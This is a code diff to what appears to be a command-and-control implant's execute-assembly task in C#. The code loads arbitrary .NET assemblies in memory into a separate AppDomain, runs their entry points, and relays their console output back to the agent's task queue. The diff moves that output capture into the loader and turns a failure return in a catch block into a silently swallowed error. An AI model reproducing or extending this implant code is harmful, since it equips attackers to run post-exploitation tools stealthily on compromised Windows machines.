@@ -121,7 +121,7 @@ namespace Tasks
             }
             catch
             {
-                return false;
+                
             }
             var Sleeve = new CrossAppDomainDelegate(Console.Beep);
             var Ace = new CrossAppDomainDelegate(ActivateLoader);
@@ -166,9 +166,23 @@ namespace Tasks
             return true;
         }
 
-        static void ActivateLoader()
+        void ActivateLoader()
         {
             string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
+            EventableStringWriter stdoutWriter = new EventableStringWriter();
+            stdoutWriter.BufferWritten += (sender, args) =>
+            {
+                if (!string.IsNullOrEmpty(args.Data))
+                {
+                    _agent.GetTaskManager().AddTaskResponseToQueue(
+                        CreateTaskResponse(
+                            args.Data,
+                            false,
+                            ""));
+                }
+            };
+            Console.SetOut(stdoutWriter);
+            Console.SetError(stdoutWriter);
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
                 if (!asm.FullName.Contains("mscor"))
@@ -183,6 +197,8 @@ namespace Tasks
                         }
                     }
                     asm.EntryPoint.Invoke(null, new object[] { str });
+                    Console.Out.Flush();
+                    Console.Error.Flush();
                 }
             }
         }
@@ -216,21 +232,6 @@ namespace Tasks
                     {
                         byte[] ByteData = assemblyBytes;
                         string[] stringData = ParseCommandLine(parameters.AssemblyArguments);
-                        
-                        EventableStringWriter stdoutWriter = new EventableStringWriter();
-                        stdoutWriter.BufferWritten += (sender, args) =>
-                        {
-                            if (!string.IsNullOrEmpty(args.Data))
-                            {
-                                _agent.GetTaskManager().AddTaskResponseToQueue(
-                                    CreateTaskResponse(
-                                        args.Data,
-                                        false,
-                                        ""));
-                            }
-                        };
-                        Console.SetOut(stdoutWriter);
-                        Console.SetError(stdoutWriter);
 
                         if (loadAppDomainModule(stringData, ByteData))
                         {
